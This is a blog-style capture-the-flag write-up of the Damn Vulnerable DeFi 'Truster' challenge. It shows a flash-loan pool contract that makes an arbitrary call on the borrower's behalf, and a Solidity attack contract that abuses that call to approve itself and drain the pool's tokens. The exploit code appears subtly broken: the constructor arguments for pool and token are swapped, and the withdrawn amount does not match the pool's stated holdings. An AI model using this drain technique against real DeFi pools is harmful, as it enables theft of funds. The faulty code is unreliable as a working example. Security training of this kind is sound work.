---
title: DamnVulnerableDeFi-3
date: 2023-12-29 15:48:33
tags:
    - Defi
    - DamnVulnerableDefi
categories: 
    - DamnVulnerableDefi
---

```
More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.
```

## Code
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/utils/Address.sol";
import "openzeppelin-contracts/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant returns (bool) {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}
```

## Observation
- similiar to FlashLoan,but not from IERC3156FlashLender ,instead its use target and calldata to call the callback function.
- so we can see there is a functioncall in `flashLoan()` , which means we can excute  repay

![[Pasted image 20231228103125.png]]


## Attack
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../lib/forge-std/src/Test.sol";
import "../../src/3-truster/TrusterLenderPool.sol";
import "../../src/DamnValuableToken.sol";

contract TmpAttacker {
    uint256 internal constant INITIAL_BALANCE = 100000e18;

    address player;
    address pool;
    DamnValuableToken token;

    constructor(address _player, address _pool, address _token) {
        player = _player;
        pool = _pool;
        token = DamnValuableToken(_token);
    }

    function withdraw() external {
        token.transferFrom(pool, player, INITIAL_BALANCE);
    }
}

contract Trustertest is Test {
    uint256 internal constant INITIAL_BALANCE = 100000e18;

    function setUp(address _pool, address _token) public {
        TmpAttacker attacker = new TmpAttacker(msg.sender, _token, _pool);

        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            INITIAL_BALANCE
        );
        pool.flashLoan(0, address(attacker), _token, data);
        attacker.withdraw();
    }

    function testattack() public {}
}